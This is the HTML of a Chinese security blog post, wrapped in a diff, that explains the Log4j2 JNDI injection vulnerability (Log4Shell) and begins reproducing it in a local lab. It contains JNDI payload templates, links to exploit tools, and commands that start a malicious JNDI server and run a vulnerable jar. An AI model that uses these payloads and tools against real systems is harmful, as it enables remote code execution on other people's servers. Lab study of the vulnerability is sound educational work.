@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Java Log4j - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="java log4j">
+  <meta itemprop="datePublished" content="2024-08-15T09:32:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:32:01+08:00">
+  <meta itemprop="wordCount" content="238">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="java log4j">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:32:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:32:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java log4j">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/15/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "java log4j",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/16\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  238 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/16\/","datePublished": "2024-08-15T09:32:01+08:00","dateModified": "2024-08-15T09:32:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Java Log4j</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Java Log4j</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:32:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="238 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="漏洞原理" class="heading-element"><span>0.0.0.1  漏洞原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>Apache Log4j-2存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用可以造成任意代码执行。</p>
+<h6 id="基础概念" class="heading-element"><span>0.0.0.1.1  基础概念</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e6%a6%82%e5%bf%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>
+<p>log4j是什么？</p>
+<p>Apache的开源项目log4j是一个功能强大的日志组件（框架）,提供方便的日志记录。</p>
+<p><a href="https://www.jianshu.com/p/9fca47678ba4"target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/9fca47678ba4</a></p>
+<p><a href="https://juejin.cn/post/6844904147167395848"target="_blank" rel="external nofollow noopener noreferrer">https://juejin.cn/post/6844904147167395848</a></p>
+</li>
+<li>
+<p>lookup</p>
+<p>log4j中的Lookup机制允许使用JNDI来动态地管理日志记录器的配置信息 ，lookup的本意是方便开发人员进行调试的时候查看环境变量等信息，但是同时也可以被恶意利用，它不仅可以用来回显环境变量，还可以进行jndi注入，我暂时简单理解为log4j利用的本质就是一种jndi注入。</p>
+<p><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html"target="_blank" rel="external nofollow noopener noreferrer">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540528.png" alt="image-20230314154011461" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540528.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540528.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540528.png?size=large 2x" data-title="image-20230314154011461" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</li>
+<li>
+<p>Maven</p>
+<p>Maven是一个Java项目管理工具，它可以帮助开发人员自动化构建、测试、部署和管理Java项目。</p>
+<p>Maven的主要功能包括：</p>
+<ul>
+<li>项目管理：Maven可以自动创建项目结构和文件，包括源代码目录、资源目录和测试目录等。</li>
+<li>依赖管理：Maven可以自动下载和管理项目所需的依赖库，并且可以通过中央仓库和私有仓库来管理依赖库。</li>
+<li>构建管理：Maven可以自动化执行项目的编译、测试、打包和部署等构建任务，可以通过插件来扩展构建任务。</li>
+<li>文档生成：Maven可以根据项目的源代码和注释生成项目文档，并且可以通过插件来扩展文档生成功能。</li>
+</ul>
+</li>
+<li>
+<p>JNDI</p>
+<p>翻译过来就是 java命名和目录接口 ，是一组在java应用中访问命名和目录服务的API，命名服务将名称和对象联系起来，使得我们可以用名称访问对象，在Java平台中，有多个JNDI的实现类可供选择，其中一些主要的实现类包括：</p>
+<ol>
+<li>LDAP provider：是基于X.500标准的轻量级目录访问协议，用于访问LDAP服务器，通过JNDI API可以实现连接、搜索、读取、修改等操作。Java平台中提供了一个LDAP provider，支持访问大多数LDAP服务器，如Microsoft Active Directory、OpenLDAP等。</li>
+<li>RMI provider：用于访问远程对象，通过JNDI API可以实现在不同Java虚拟机之间的对象传输。Java平台中提供了一个RMI provider，支持远程对象的查找和绑定等操作。可以实现java远程方法调用</li>
+<li>DNS provider：用于访问DNS服务，通过JNDI API可以实现域名解析、查找DNS条目等操作。Java平台中提供了一个DNS provider，支持访问常见的DNS服务器。</li>
+</ol>
+</li>
+<li>
+<p>JNDI注入</p>
+<p>当你开发 Java 应用程序时，你可能需要访问外部资源，JNDI提供了在 Java 应用程序中访问外部资源的方法，让你可以像访问文件系统一样访问外部资源。</p>
+<p>JNDI 注入是一种将外部资源注入到 Java 应用程序中的方式。</p>
+<p>攻击者利用JNDI注入漏洞的一般过程如下：</p>
+<ol>
+<li>攻击者发送恶意数据，例如通过Web表单或URL参数等输入。</li>
+</ol>
+</li>
+</ul>
+<ol start="2">
+<li>恶意数据包含特殊的JNDI注入payload，用于欺骗JNDI上下文对象，使其执行非预期的操作。</li>
+<li>JNDI上下文对象执行恶意操作，例如读取文件、执行命令等。</li>
+</ol>
+<p>例如，可以利用RMI把恶意代码写在远程服务器上，然后进行JNDI注入，让远程服务器的代码执行，类似于php的文件包含</p>
+<p>{jndi:rmi//xxx.xxx.xxx}</p>
+<p>{jndi:ldap//xxx.xxx.xxx}</p>
+<ul>
+<li>
+<p>JNDI注入工具</p>
+<p><strong><a href="https://github.com/welk1n/JNDI-Injection-Exploit"target="_blank" rel="external nofollow noopener noreferrer">JNDI-Injection</a></strong></p>
+<p><strong><a href="https://github.com/mbechler/marshalsec"target="_blank" rel="external nofollow noopener noreferrer">marshalsec</a></strong></p>
+</li>
+</ul>
+<h6 id="原理" class="heading-element"><span>0.0.0.1.2  原理</span>
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>综上大致得到了对于log4j漏洞的基本认识， Log4j是一个Java日志框架，允许开发人员按照不同的方式记录日志。其中一个重要的特性就是lookup机制，它允许用户在日志输出中使用占位符，并动态地替换这些占位符为实际的值。 Log4j的lookup机制可以通过使用“${}”语法来实现。具体来说，可以在日志输出中使用“${}”，并在运行时通过设置相关的属性来替换这些占位符。例如，可以使用以下语句在日志输出中引用环境变量：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">logger</span>.<span style="color:#58a1dd">info</span>(<span style="color:#a6be9d">&#34;The value of the HOME environment variable is ${env:HOME}&#34;</span>);</span></span></code></pre></div><p>在这个例子中，“${env:HOME}”是一个lookup表达式，它告诉Log4j在运行时查找名为“HOME”的环境变量，并将其替换为实际的值。</p>
+<p>更多lookup相关可以查看文档：https://logging.apache.org/log4j/2.x/manual/lookups.html</p>
+<p>以下是lookup支持输出的环境变量</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540950.png" alt="image-20230314154032871" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540950.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540950.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540950.png?size=large 2x" data-title="image-20230314154032871" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>除了环境变量之外，Log4j还支持其他类型的lookup。</p>
+<ol>
+<li>系统属性：通过使用<code>${sys:propertyName}</code>语法，可以引用JVM中的系统属性，其中<code>propertyName</code>是系统属性的名称。</li>
+<li>Java JNDI：使用<code>${jndi:contextName:propertyName}</code>语法，可以在JNDI上下文中查找属性值，其中<code>contextName</code>是JNDI上下文的名称，<code>propertyName</code>是要查找的属性的名称。</li>
+<li>本地变量：使用<code>${local:variableName}</code>语法，可以引用在当前线程中定义的本地变量，其中<code>variableName</code>是变量的名称。</li>
+<li>随机数：使用<code>${random}</code>语法，可以生成一个随机数。</li>
+<li>时间戳：使用<code>${date}</code>语法，可以生成当前日期和时间的时间戳，格式可以根据需要进行指定。</li>
+</ol>
+<p>也即 Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</p>
+<p>主要问题出现在lookup支持Java JNDI, 是有可能造成JNDI注入的，或者说log4j漏洞的利用方式本质上就是JNDI注入。</p>
+<p>攻击者可以通过构造一个恶意的JNDI URL，注入到web站点接收日志消息的地方，发送给Log4j 2.x框架来利用该漏洞。当Log4j 2.x框架在处理该日志消息时，它会尝试查找该JNDI URL中指定的上下文和属性，这可能会导致恶意代码的执行。攻击者可以使用此漏洞来执行任意代码，包括在目标系统上执行命令、窃取敏感数据等。</p>
+<h5 id="影响范围" class="heading-element"><span>0.0.0.2  影响范围</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e8%8c%83%e5%9b%b4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>日志处理模块 Apache Log4j 2.x &lt;= 2.14.1</p>
+<p>jdk版本 &lt;=&ldquo;1.8.0_121&rdquo;</p>
+<h5 id="漏洞复现和利用" class="heading-element"><span>0.0.0.3  漏洞复现和利用</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0%e5%92%8c%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="本地快速复现" class="heading-element"><span>0.0.0.3.1  本地快速复现</span>
+  <a href="#%e6%9c%ac%e5%9c%b0%e5%bf%ab%e9%80%9f%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://github.com/Yihsiwei/Log4j-exp"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Yihsiwei/Log4j-exp</a></p>
+<p>下载<code>Log4j-exp</code></p>
+<pre tabindex="0"><code>https://github.com/feihong-cs/JNDIExploit</code></pre><p>开启JNDI服务</p>
+<pre tabindex="0"><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.31.1</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541883.png" alt="image-20230314154100815" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541883.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541883.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541883.png?size=large 2x" data-title="image-20230314154100815" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里相当于受害站点</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541627.png" alt="image-20230314154122566" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541627.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541627.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541627.png?size=large 2x" data-title="image-20230314154122566" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>打一个jar包并执行</p>
+<pre tabindex="0"><code>java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar Log4j-rce.jar</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541947.png" alt="image-20230314154142857" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541947.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541947.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541947.png?size=large 2x" data-title="image-20230314154142857" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="通过vulhub靶场复现" class="heading-element"><span>0.0.0.3.2  通过vulhub靶场复现</span>
+  <a href="#%e9%80%9a%e8%bf%87vulhub%e9%9d%b6%e5%9c%ba%e5%a4%8d%e7%8e%b0" class="heading-mark">
